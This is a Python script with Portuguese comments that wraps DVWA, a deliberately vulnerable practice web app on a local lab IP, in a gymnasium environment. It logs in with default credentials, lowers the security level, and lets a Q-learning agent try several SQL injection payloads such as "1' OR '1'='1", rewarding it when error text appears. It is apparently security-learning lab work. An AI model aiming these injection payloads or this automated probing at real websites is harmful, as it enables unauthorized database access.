import gymnasium as gym
from gymnasium import spaces
import numpy as np
import random
import time

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import Select

# =========================
# AMBIENTE DVWA COM SELENIUM
# =========================

class DVWAEnv(gym.Env):

    def __init__(self):
        super(DVWAEnv, self).__init__()

        self.base_url = "http://192.168.56.101/dvwa"
        self.login_url = self.base_url + "/login.php"
        self.target_url = self.base_url + "/vulnerabilities/sqli/"

        # ações (payloads)
        self.actions = [
            "1",
            "1' OR '1'='1",
            "1' OR 1=1 --",
            "abc",
            "1 AND 1=2",
            "' OR 'a'='a"
        ]

        self.action_space = spaces.Discrete(len(self.actions))
        self.observation_space = spaces.Discrete(1)

        # inicia navegador
        self.driver = webdriver.Chrome()

        self.login()

    def login(self):
        self.driver.get(self.login_url)
        time.sleep(2)

        # usuário
        username = self.driver.find_element(By.NAME, "username")
        username.send_keys("admin")

        # senha
        password = self.driver.find_element(By.NAME, "password")
        password.send_keys("password")

        password.send_keys(Keys.RETURN)
        time.sleep(2)

        print("✅ Login realizado no DVWA")

        # =========================
        # CONFIGURAR SEGURANÇA LOW
        # =========================

        self.driver.get(self.base_url + "/security.php")
        time.sleep(2)

        try:
            dropdown = Select(self.driver.find_element(By.NAME, "security"))
            dropdown.select_by_visible_text("Low")

            apply_button = self.driver.find_element(By.NAME, "seclev_submit")
            apply_button.click()

            time.sleep(2)

            print("✅ Nível de segurança alterado para LOW")

        except Exception as e:
            print("❌ Erro ao configurar segurança:", e)

    def step(self, action):

        payload = self.actions[action]

        # vai para página vulnerável
        self.driver.get(self.target_url)
        time.sleep(2)

        try:
            # campo de input
            input_box = self.driver.find_element(By.NAME, "id")

            input_box.clear()
            input_box.send_keys(payload)
            input_box.send_keys(Keys.RETURN)

            time.sleep(2)

            page_source = self.driver.page_source.lower()

            # recompensa
            if "sql" in page_source or "error" in page_source:
                reward = 2
            elif "mysql" in page_source:
                reward = 3
            else:
                reward = -1

        except:
            reward = -1

        state = 0
        done = False

        return state, reward, done, False, {}

    def reset(self, seed=None, options=None):
        return 0, {}

    def close(self):
        self.driver.quit()

# =========================
# AGENTE Q-LEARNING
# =========================

env = DVWAEnv()

q_table = np.zeros((1, env.action_space.n))

alpha = 0.7
gamma = 0.9
epsilon = 1.0
epsilon_decay = 0.99
epsilon_min = 0.05

episodes = 50  # Selenium é mais lento

# =========================
# TREINAMENTO
# =========================

for episode in range(episodes):

    state, _ = env.reset()

    if random.uniform(0, 1) < epsilon:
        action = env.action_space.sample()
    else:
        action = np.argmax(q_table[state])

    next_state, reward, done, _, _ = env.step(action)

    old_value = q_table[state, action]
    next_max = np.max(q_table[next_state])

    q_table[state, action] = old_value + alpha * (reward + gamma * next_max - old_value)

    epsilon = max(epsilon_min, epsilon * epsilon_decay)

    print(f"[{episode}] Payload: {env.actions[action]} | Reward: {reward}")

# =========================
# RESULTADO
# =========================

best_action = np.argmax(q_table[0])

print("\nMelhor payload encontrado:")
print(env.actions[best_action])

env.close()